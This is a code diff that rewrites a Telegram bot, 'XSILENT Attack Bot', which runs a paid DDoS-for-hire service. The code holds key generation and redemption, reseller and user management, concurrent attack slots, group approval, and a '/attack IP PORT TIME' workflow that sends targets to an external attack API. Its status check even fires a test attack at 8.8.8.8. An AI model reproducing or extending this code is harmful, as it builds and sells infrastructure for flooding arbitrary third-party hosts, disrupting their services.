+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /redeem KEY")
+        return
+    
+    key = args[1]
+    
+    if key not in keys_data:
+        bot.reply_to(msg, "❌ Invalid key!")
+        return
+    
+    key_info = keys_data[key]
+    
+    if key_info.get("used", False):
+        bot.reply_to(msg, "❌ Key already used!")
+        return
+    
+    # Check if key is expired
+    if time.time() > key_info.get("expires_at", 0):
+        bot.reply_to(msg, "❌ Key has expired!")
+        return
+    
+    # Check if user already has an active subscription
+    user_has_active = check_user_expiry(uid)
+    
+    # Mark key as used
+    key_info["used"] = True
+    key_info["used_by"] = uid
+    key_info["used_at"] = time.time()
+    keys_data[key] = key_info
+    save_keys(keys_data)
+    
+    # Calculate new expiry
+    if user_has_active:
+        # Find current expiry and extend
+        current_expiry = 0
+        for k, info in keys_data.items():
+            if info.get("used_by") == uid and info.get("used") == True:
+                if info.get("expires_at", 0) > current_expiry:
+                    current_expiry = info.get("expires_at", 0)
+        
+        if current_expiry > time.time():
+            new_expiry = current_expiry + (key_info["expires_at"] - key_info["generated_at"])
+        else:
+            new_expiry = key_info["expires_at"]
+    else:
+        new_expiry = key_info["expires_at"]
+    
+    # Add user if not already in system
+    if uid not in users and uid not in ADMIN_ID:
+        users.append(uid)
+        users_data["users"] = users
+        save_users(users_data)
+    
+    # Create a new key record with updated expiry for the user
+    new_key_record = key_info.copy()
+    new_key_record["expires_at"] = new_expiry
+    keys_data[key + "_used"] = new_key_record
+    
+    expiry_date = datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')
+    bot.reply_to(msg, f"✅ KEY REDEEMED SUCCESSFULLY!\n\n🔑 Key: {key}\n👤 User: {uid}\n⏰ Access until: {expiry_date}\n\nYou now have attack access! Use /attack to start attacking.")
+    
+    # Notify admin
+    for admin in ADMIN_ID:
+        try:
+            bot.send_message(admin, f"✅ Key redeemed!\nUser: {uid}\nKey: {key}\nExpires: {expiry_date}")
+        except:
+            pass
+
+@bot.message_handler(commands=['status'])
+def status(msg):
+    uid = str(msg.chat.id)
+    
+    # Check if user is blocked
+    if is_user_blocked(uid):
+        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
+        return
+    
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, "❌ Unauthorized!")
+        return
+    
+    slot1_free, slot2_free, slot1_info, slot2_info = format_attack_status()
+    total_active = check_total_active_attacks()
+    
+    status_msg = "📊 SLOT STATUS\n\n"
+    
+    if slot1_free:
+        status_msg += "✅ SLOT 1: FREE\n"
+    else:
+        status_msg += "❌ SLOT 1: BUSY\n" + slot1_info + "\n"
+    
+    status_msg += "\n"
+    
+    if slot2_free:
+        status_msg += "✅ SLOT 2: FREE\n"
+    else:
+        status_msg += "❌ SLOT 2: BUSY\n" + slot2_info + "\n"
+    
+    status_msg += "\n📊 TOTAL ACTIVE: " + str(total_active) + "/" + str(MAX_CONCURRENT)
+    
+    if uid in cooldown:
+        remaining = 30 - (time.time() - cooldown[uid])
+        if remaining > 0:
+            status_msg += "\n⏳ YOUR COOLDOWN: " + str(int(remaining)) + "s"
+    
+    bot.reply_to(msg, status_msg)
+
+@bot.message_handler(commands=['genkey'])
+def genkey(msg):
+    uid = str(msg.chat.id)
+    
+    # Check if user is blocked
+    if is_user_blocked(uid):
+        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
+        return
+    
+    if uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, "❌ Admin or Reseller only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
+        return
+    
+    duration_str = args[1]
+    
+    value, unit = parse_duration(duration_str)
+    if value is None:
+        bot.reply_to(msg, "❌ Invalid duration!\nUse: 1 (1 day) or 5h (5 hours)")
+        return
+    
+    key = generate_key()
+    expires_at = get_expiry_date(value, unit)
+    
+    keys_data[key] = {
+        "user_id": "pending",
+        "duration_value": value,
+        "duration_unit": unit,
+        "generated_by": uid,
+        "generated_at": time.time(),
+        "expires_at": expires_at.timestamp(),
+        "used": False
+    }
+    save_keys(keys_data)
+    
+    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
+    duration_display = format_duration(value, unit)
+    
+    bot.reply_to(msg, "✅ KEY GENERATED!\n\n🔑 Key: `" + key + "`\n⏰ Duration: " + duration_display + "\n📅 Expires: " + expiry_str + "\n\nShare this key with user!\nUser: /redeem " + key)
+
+@bot.message_handler(commands=['removekey'])
+def remove_key(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /removekey KEY")
+        return
+    
+    key = args[1]
+    
+    if key not in keys_data:
+        bot.reply_to(msg, "❌ Key not found!")
+        return
+    
+    del keys_data[key]
+    save_keys(keys_data)
+    
+    bot.reply_to(msg, "✅ KEY REMOVED!\nKey: " + key)
+
+@bot.message_handler(commands=['add'])
+def add_user(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /add USER_ID")
+        return
+    
+    new_user = args[1]
+    
+    if new_user in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot add owner!")
+        return
+    
+    if is_user_blocked(new_user):
+        bot.reply_to(msg, "❌ This user is blocked! Unblock them first.")
+        return
+    
+    if new_user in users:
+        bot.reply_to(msg, "❌ User already has access!")
+        return
+    
+    users.append(new_user)
+    users_data["users"] = users
+    save_users(users_data)
+    
+    bot.reply_to(msg, "✅ USER ADDED!\n\n👤 User: " + new_user + "\n✅ Now has attack access!")
     
     try:
-        user_id = int(context.args[0])
-        if db.remove_reseller(user_id):
-            await update.message.reply_text(f"✅ User `{user_id}` is no longer a reseller.", parse_mode='MarkdownV2')
-            try:
-                await context.bot.send_message(user_id, "❌ Your reseller privileges have been removed.")
-            except:
-                pass
-        else:
-            await update.message.reply_text("❌ User was not a reseller.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
+        bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
+    except:
+        pass
 
-@admin_required
-async def resellers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    resellers = db.get_resellers()
-    if not resellers:
-        await update.message.reply_text("📭 No resellers found.", parse_mode='MarkdownV2')
+@bot.message_handler(commands=['remove'])
+def remove_user(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
         return
     
-    message = "👑 **Reseller List**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for r in resellers:
-        message += f"🆔 User ID: `{r['user_id']}`\n"
-        message += f"📅 Added: `{r['added_at'].strftime('%Y-%m-%d %H:%M')}`\n\n"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-@admin_required
-async def addgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 1:
-        await update.message.reply_text("❌ Usage: `/addgroup <group_id> [group_name]`\n\nExample: `/addgroup -100123456789 My Group`", parse_mode='MarkdownV2')
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /remove USER_ID")
         return
+    
+    target_user = args[1]
+    
+    if target_user in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot remove owner!")
+        return
+    
+    if target_user not in users:
+        bot.reply_to(msg, "❌ User not found!")
+        return
+    
+    users.remove(target_user)
+    users_data["users"] = users
+    save_users(users_data)
+    
+    if target_user in resellers:
+        resellers.remove(target_user)
+        users_data["resellers"] = resellers
+        save_users(users_data)
+    
+    for attack_id in list(active_attacks.keys()):
+        if active_attacks[attack_id]["user"] == target_user:
+            del active_attacks[attack_id]
+    
+    if target_user in cooldown:
+        del cooldown[target_user]
+    
+    bot.reply_to(msg, "✅ USER REMOVED!\n\n👤 User: " + target_user + "\n❌ Attack access revoked!")
     
     try:
-        group_id = int(context.args[0])
-        group_name = context.args[1] if len(context.args) > 1 else None
-        if db.add_allowed_group(group_id, group_name):
-            await update.message.reply_text(f"✅ Group `{group_id}` added to allowed list.", parse_mode='MarkdownV2')
-        else:
-            await update.message.reply_text("❌ Group already exists.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid group ID.")
+        bot.send_message(target_user, "⚠️ Your attack access has been revoked by owner!")
+    except:
+        pass
 
-@admin_required
-async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 1:
-        await update.message.reply_text("❌ Usage: `/removegroup <group_id>`", parse_mode='MarkdownV2')
+@bot.message_handler(commands=['addreseller'])
+def add_reseller(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
         return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /addreseller USER_ID")
+        return
+    
+    new_reseller = args[1]
+    
+    if new_reseller in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
+        return
+    
+    if is_user_blocked(new_reseller):
+        bot.reply_to(msg, "❌ This user is blocked! Unblock them first.")
+        return
+    
+    if new_reseller in resellers:
+        bot.reply_to(msg, "❌ User is already a reseller!")
+        return
+    
+    resellers.append(new_reseller)
+    users_data["resellers"] = resellers
+    save_users(users_data)
+    
+    if new_reseller not in users:
+        users.append(new_reseller)
+        users_data["users"] = users
+        save_users(users_data)
+    
+    bot.reply_to(msg, "✅ RESELLER ADDED!\n\n👤 Reseller: " + new_reseller + "\n🔑 Can now generate keys using /genkey")
     
     try:
-        group_id = int(context.args[0])
-        if db.remove_allowed_group(group_id):
-            await update.message.reply_text(f"✅ Group `{group_id}` removed from allowed list.", parse_mode='MarkdownV2')
-        else:
-            await update.message.reply_text("❌ Group not found.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid group ID.")
+        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
+    except:
+        pass
 
-@admin_required
-async def groups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    groups = db.get_groups()
-    if not groups:
-        await update.message.reply_text("📭 No allowed groups.\n\nUse `/addgroup` to add a group.", parse_mode='MarkdownV2')
+@bot.message_handler(commands=['removereseller'])
+def remove_reseller(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
         return
     
-    message = "👥 **Allowed Groups**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for g in groups:
-        name = f" - {escape_markdown(g.get('name'))}" if g.get('name') else ""
-        message += f"🆔 `{g['group_id']}`{name}\n"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-@admin_required
-async def admin_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    users = db.get_all_users()
-    
-    if not users:
-        await update.message.reply_text("📭 No users found.", parse_mode='MarkdownV2')
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /removereseller USER_ID")
         return
     
-    approved_count = sum(1 for u in users if u.get("approved", False))
-    total_attacks = sum(u.get("total_attacks", 0) for u in users)
-    expired_count = 0
+    target_reseller = args[1]
+    
+    if target_reseller in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot remove owner!")
+        return
+    
+    if target_reseller not in resellers:
+        bot.reply_to(msg, "❌ User is not a reseller!")
+        return
+    
+    resellers.remove(target_reseller)
+    users_data["resellers"] = resellers
+    save_users(users_data)
+    
+    bot.reply_to(msg, "✅ RESELLER REMOVED!\n\n👤 User: " + target_reseller + "\n❌ Can no longer generate keys")
+    
+    try:
+        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
+    except:
+        pass
+
+@bot.message_handler(commands=['addgroup'])
+def add_group(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 3:
+        bot.reply_to(msg, "Usage: /addgroup GROUP_ID TIME (seconds)\nExample: /addgroup -100123456789 60")
+        return
+    
+    group_id = args[1]
+    attack_time = int(args[2])
+    
+    if attack_time < 30 or attack_time > 300:
+        bot.reply_to(msg, "❌ Attack time must be between 30 and 300 seconds!")
+        return
+    
+    save_group(group_id, attack_time, uid)
+    
+    bot.reply_to(msg, f"✅ GROUP ADDED!\n\nGroup ID: {group_id}\nAttack Time: {attack_time}s")
+    
+    try:
+        bot.send_message(int(group_id), f"✅ Group approved!\nAttack time: {attack_time}s\nUse /attack IP PORT in this group!")
+    except:
+        pass
+
+@bot.message_handler(commands=['removegroup'])
+def remove_group_cmd(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /removegroup GROUP_ID")
+        return
+    
+    group_id = args[1]
+    remove_group(group_id)
+    
+    bot.reply_to(msg, f"✅ GROUP REMOVED!\nGroup ID: {group_id}")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /broadcast MESSAGE")
+        return
+    
+    broadcast_msg = args[1]
+    
+    success = 0
+    failed = 0
     
     for user in users:
-        expires_at = user.get("expires_at")
-        if expires_at:
-            expires_at = make_aware(expires_at)
-            if expires_at < get_current_time():
-                expired_count += 1
+        try:
+            bot.send_message(user, f"📢 BROADCAST MESSAGE:\n\n{broadcast_msg}")
+            success += 1
+        except:
+            failed += 1
     
-    message = (
-        f"👥 **User Statistics**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📊 Total Users: `{len(users)}`\n"
-        f"✅ Approved: `{approved_count}`\n"
-        f"❌ Expired: `{expired_count}`\n"
-        f"🎯 Total Attacks: `{total_attacks}`\n\n"
-        f"📋 **Recent Users:**\n"
-    )
-    
-    for user in users[:10]:
-        user_id = user.get('user_id', 'Unknown')
-        status = "✅" if user.get("approved", False) else "❌"
-        attacks = user.get("total_attacks", 0)
-        message += f"`{user_id}` → {status} | {attacks} attacks\n"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
+    bot.reply_to(msg, f"✅ BROADCAST SENT!\n\nSent: {success}\nFailed: {failed}")
 
-@admin_required
-async def api_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    status_msg = await update.message.reply_text("🔄 **Checking API health...**", parse_mode='MarkdownV2')
+@bot.message_handler(commands=['stopattack'])
+def stop_attack(msg):
+    uid = str(msg.chat.id)
     
-    health = check_api_health()
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
     
-    if health.get("status") == "ok":
-        message = (
-            f"✅ **API Status: Healthy**\n\n"
-            f"🕐 Timestamp: `{health.get('timestamp', 'N/A')}`\n"
-            f"📦 Version: `{health.get('version', 'N/A')}`\n\n"
-            f"🌐 API URL: `{API_URL}`"
-        )
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /stopattack IP:PORT\nExample: /stopattack 1.1.1.1:443")
+        return
+    
+    target = args[1]
+    
+    stopped = 0
+    for attack_id, info in list(active_attacks.items()):
+        if info["target_key"] == target:
+            del active_attacks[attack_id]
+            stopped += 1
+    
+    if stopped > 0:
+        bot.reply_to(msg, f"✅ STOPPED ATTACK!\nTarget: {target}\nStopped {stopped} attack(s)")
     else:
-        message = (
-            f"❌ **API Status: Unhealthy**\n\n"
-            f"Error: `{health.get('error', 'Unknown error')}`\n\n"
-            f"🌐 API URL: `{API_URL}`\n\n"
-            f"📌 Possible issues:\n"
-            f"• API server is down\n"
-            f"• Network connection problem\n"
-            f"• Invalid API key"
-        )
-    
-    await status_msg.edit_text(message, parse_mode='MarkdownV2')
+        bot.reply_to(msg, f"❌ No active attack found for target: {target}")
 
-@admin_required
-async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    status_msg = await update.message.reply_text("🔄 **Fetching active attacks...**", parse_mode='MarkdownV2')
+@bot.message_handler(commands=['allusers'])
+def all_users(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
     
-    attacks = check_running_attacks()
-    
-    if attacks.get("success"):
-        active_attacks = attacks.get("activeAttacks", [])
-        if active_attacks:
-            message = f"🎯 **Active Attacks** (`{len(active_attacks)}`)\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            for attack in active_attacks[:10]:
-                message += (
-                    f"🔹 Target: `{attack.get('target', 'N/A')}`\n"
-                    f"   ⏱️ Expires in: `{attack.get('expiresIn', 'N/A')}`s\n\n"
-                )
+    user_list = []
+    for u in users:
+        if u in ADMIN_ID:
+            role = "👑 OWNER"
+        elif u in resellers:
+            role = "💎 RESELLER"
         else:
-            message = "✅ **No active attacks** running on API."
-        
-        message += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        message += f"📊 Current: `{attacks.get('count', 0)}` / `{attacks.get('maxConcurrent', 0)}`\n"
-        message += f"📌 Remaining slots: `{attacks.get('remainingSlots', 0)}`"
+            role = "👤 USER"
+        user_list.append(role + ": " + u)
+    
+    if user_list:
+        response = "📋 ALL USERS:\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}"
     else:
-        message = f"❌ **Failed to fetch active attacks**\n\nError: `{attacks.get('error', 'Unknown error')}`"
+        response = "📋 No users found."
     
-    await status_msg.edit_text(message, parse_mode='MarkdownV2')
+    bot.reply_to(msg, response)
 
-@admin_required
-async def bot_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stats = db.get_bot_stats()
-    api_stats = get_api_stats()
+@bot.message_handler(commands=['allgroups'])
+def all_groups(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
     
-    message = (
-        f"📊 **Bot Statistics**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"👥 **Users:**\n"
-        f"• Total: `{stats['total_users']}`\n"
-        f"• Approved: `{stats['approved_users']}`\n\n"
-        f"🎯 **Attacks:**\n"
-        f"• Total: `{stats['total_attacks']}`\n"
-        f"• Today: `{stats['today_attacks']}`\n\n"
-        f"⚙️ **Concurrent Limit:** `{db.get_concurrent_limit()}`\n"
-        f"📌 **Active in Memory:** `{len(context.bot_data.get('active_attacks', {}))}`"
-    )
+    groups_list = []
+    for group_id, group_info in groups.items():
+        groups_list.append(f"Group: {group_id}\nAttack Time: {group_info['attack_time']}s\nAdded by: {group_info['added_by']}\n")
     
-    if api_stats.get("success"):
-        message += f"\n\n🌐 **API Stats:**\n"
-        message += f"• Active: `{api_stats.get('activeAttacks', 0)}`\n"
-        message += f"• Max Concurrent: `{api_stats.get('maxConcurrent', 0)}`"
+    if groups_list:
+        response = "📋 ALL GROUPS:\n\n" + "\n".join(groups_list) + f"\nTotal: {len(groups)}"
+    else:
+        response = "📋 No groups found."
     
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
+    bot.reply_to(msg, response)
 
-@admin_required
-async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Set max concurrent attacks: /set_concurrent 5 (1-300)"""
-    if len(context.args) != 1:
-        await update.message.reply_text(
-            "❌ **Usage:** `/set_concurrent <1-300>`\n\n"
-            "Example: `/set_concurrent 5`\n"
-            "This allows maximum 5 concurrent attacks.",
-            parse_mode='MarkdownV2'
-        )
+@bot.message_handler(commands=['api_status'])
+def api_status(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
         return
     
     try:
-        limit = int(context.args[0])
-        if limit < 1 or limit > 300:
-            await update.message.reply_text("❌ Limit must be between **1** and **300**.", parse_mode='MarkdownV2')
-            return
-        
-        db.set_concurrent_limit(limit)
-        await update.message.reply_text(
-            f"✅ **Concurrent attack limit set to `{limit}`**\n\n"
-            f"📌 Users can now run up to `{limit}` attacks simultaneously.\n"
-            f"🔄 This change takes effect immediately.",
-            parse_mode='MarkdownV2'
-        )
-    except ValueError:
-        await update.message.reply_text("❌ Invalid number. Please enter a number between 1-300.", parse_mode='MarkdownV2')
+        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
+        api_status_text = "✅ Online" if test_response.status_code == 200 else "❌ Offline"
+        bot.reply_to(msg, f"{api_status_text}\nActive Attacks: {len(active_attacks)}")
+    except:
+        bot.reply_to(msg, "❌ API OFFLINE")
 
-# ==================== MAIN ====================
-async def post_init(application: Application):
-    """Setup background tasks after bot starts"""
-    # Initialize active attacks dict
-    application.bot_data['active_attacks'] = {}
+@bot.message_handler(commands=['mykeys'])
+def my_keys(msg):
+    uid = str(msg.chat.id)
     
-    # Setup job queue for checking attack completion
-    job_queue = application.job_queue
-    if job_queue:
-        # Check attack completion every 5 seconds
-        job_queue.run_repeating(check_attack_completion, interval=5, first=5)
-        # Cleanup expired keys and users every hour
-        job_queue.run_repeating(cleanup_expired, interval=3600, first=3600)
-        logger.info("✅ Background tasks started: attack checker + expiry cleanup")
+    if uid not in resellers and uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Reseller only!")
+        return
+    
+    user_keys = []
+    for key, info in keys_data.items():
+        if info.get("generated_by") == uid and not info.get("used", False):
+            expiry_date = datetime.fromtimestamp(info.get("expires_at", 0)).strftime('%Y-%m-%d %H:%M:%S')
+            duration = format_duration(info.get("duration_value", 0), info.get("duration_unit", "day"))
+            user_keys.append(f"🔑 {key}\n   ⏰ {duration}\n   📅 Expires: {expiry_date}\n")
+    
+    if user_keys:
+        response = "📋 YOUR KEYS:\n\n" + "\n".join(user_keys) + f"\nTotal: {len(user_keys)}"
     else:
-        logger.warning("⚠️ Job queue not available")
+        response = "📋 No keys generated yet.\nUse /genkey to create keys."
+    
+    bot.reply_to(msg, response)
 
-def main():
-    """Start the bot"""
-    print("🚀 Starting XSILENT Attack Bot...")
-    print(f"📊 Admin IDs: {ADMIN_IDS}")
-    print(f"🌐 API URL: {API_URL}")
+@bot.message_handler(commands=['help'])
+def help_cmd(msg):
+    uid = str(msg.chat.id)
     
-    # Create application
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # User commands
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("redeem", redeem_command))
-    application.add_handler(CommandHandler("attack", attack_command))
-    application.add_handler(CommandHandler("myattacks", myattacks_command))
-    application.add_handler(CommandHandler("myinfo", myinfo_command))
-    application.add_handler(CommandHandler("mystats", mystats_command))
-    application.add_handler(CommandHandler("blockedports", blockedports_command))
-    application.add_handler(CommandHandler("status", user_status_command))
-    
-    # Block user commands
-    application.add_handler(CommandHandler("block", block_user_command))
-    application.add_handler(CommandHandler("unblock", unblock_user_command))
-    application.add_handler(CommandHandler("allblocks", allblocks_command))
-    
-    # Host bot commands
-    application.add_handler(CommandHandler("host", host_bot_command))
-    application.add_handler(CommandHandler("unhost", unhost_bot_command))
-    application.add_handler(CommandHandler("blockhost", blockhost_command))
-    application.add_handler(CommandHandler("unblockhost", unblockhost_command))
-    application.add_handler(CommandHandler("allhosts", allhosts_command))
-    
-    # Reseller commands
-    application.add_handler(CommandHandler("genkey", genkey_command))
-    application.add_handler(CommandHandler("keys", keys_command))
-    application.add_handler(CommandHandler("approveuser", approveuser_command))
-    
-    # Admin commands
-    application.add_handler(CommandHandler("approve", admin_approve_command))
-    application.add_handler(CommandHandler("disapprove", admin_disapprove_command))
-    application.add_handler(CommandHandler("delkey", delkey_command))
-    application.add_handler(CommandHandler("addreseller", addreseller_command))
-    application.add_handler(CommandHandler("removereseller", removereseller_command))
-    application.add_handler(CommandHandler("resellers", resellers_command))
-    application.add_handler(CommandHandler("addgroup", addgroup_command))
-    application.add_handler(CommandHandler("removegroup", removegroup_command))
-    application.add_handler(CommandHandler("groups", groups_command))
-    application.add_handler(CommandHandler("users", admin_users_command))
-    application.add_handler(CommandHandler("api_status", api_status_command))
-    application.add_handler(CommandHandler("running", running_command))
-    application.add_handler(CommandHandler("stats", bot_stats_command))
-    application.add_handler(CommandHandler("set_concurrent", set_concurrent_command))
-    
-    # Setup post_init
-    application.post_init = post_init
-    
-    # Start bot
-    print("✅ Bot is running...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    if uid in ADMIN_ID:
+        help_text = """🔥 XSILENT BOT HELP - OWNER
 
-if __name__ == "__main__":
-    main()
+📝 ATTACK COMMANDS:
+/attack IP PORT TIME - Start attack
+/status - Check bot status
+
+🔑 KEY COMMANDS:
+/genkey 1 - Generate 1 day key
+/genkey 5h - Generate 5 hour key
+/removekey KEY - Remove key
+
+👥 USER MANAGEMENT:
+/add USER_ID - Add user
+/remove USER_ID - Remove user
+/addreseller USER_ID - Add reseller
+/removereseller USER_ID - Remove reseller
+
+👥 BLOCK COMMANDS:
+/block USER_ID REASON - Block user
+/unblock USER_ID - Unblock user
+/blockedlist - List blocked users
+
+👥 HOST COMMAND:
+/host COMMAND - Block command on bot host
+
+👥 GROUP MANAGEMENT:
+/addgroup GROUP_ID TIME - Add group
+/removegroup GROUP_ID - Remove group
+
+📢 OTHER COMMANDS:
+/broadcast MSG - Broadcast message
+/stopattack IP:PORT - Stop attack
+/allusers - List all users
+/allgroups - List all groups
+/api_status - Check API status
+"""
+    elif uid in resellers:
+        help_text = """🔥 XSILENT BOT HELP - RESELLER
+
+📝 ATTACK COMMANDS:
+/attack IP PORT TIME - Start attack
+/status - Check bot status
+
+🔑 KEY COMMANDS:
+/genkey 1 - Generate 1 day key
+/genkey 5h - Generate 5 hour key
+/mykeys - List your generated keys
+"""
+    elif uid in users:
+        help_text = """🔥 XSILENT BOT HELP - USER
+
+📝 ATTACK COMMANDS:
+/attack IP PORT TIME - Start attack
+/status - Check bot status
+
+🔑 KEY COMMANDS:
+/redeem KEY - Redeem access key
+
+ℹ️ INFO:
+/start - Show start message
+/help - Show this help
+"""
+    else:
+        help_text = """🔥 XSILENT BOT HELP
+
+🔑 TO GET ACCESS:
+/redeem KEY - Redeem your access key
+
+ℹ️ INFO:
+/start - Show start message
+/help - Show this help
+"""
+    
+    bot.reply_to(msg, help_text)
+
+def cleanup_attacks():
+    while True:
+        time.sleep(5)
+        now = time.time()
+        
+        for attack_id, info in list(active_attacks.items()):
+            if now >= info["finish_time"]:
+                del active_attacks[attack_id]
+        
+        for key, info in list(keys_data.items()):
+            if info.get("used", False) and now > info["expires_at"]:
+                user_id = info.get("used_by")
+                if user_id and user_id in users and user_id not in ADMIN_ID:
+                    users.remove(user_id)
+                    users_data["users"] = users
+                    save_users(users_data)
+
+# Message handler to block host commands
+@bot.message_handler(func=lambda msg: True)
+def block_host_commands(msg):
+    """Block commands that are in the blocked list"""
+    blocked_commands_data = settings_collection.find_one({"_id": "blocked_commands"})
+    if blocked_commands_data:
+        blocked_commands = blocked_commands_data.get("commands", [])
+        for blocked_cmd in blocked_commands:
+            if msg.text and msg.text.startswith(blocked_cmd):
+                bot.reply_to(msg, "🚫 BLOCKED BOT\n\nThis command has been blocked by the host.\nContact bot owner for more information.")
+                return
+
+cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
+cleanup_thread.start()
+
+print("XSILENT BOT STARTED - Owner: 8487946379")
+print("Features:")
+print("✅ Host command blocking feature enabled")
+print("✅ User blocking feature enabled")
+print("✅ Fixed key redemption issue")
+print("✅ Block user command added (/block, /unblock, /blockedlist)")
+
+bot.infinity_polling()
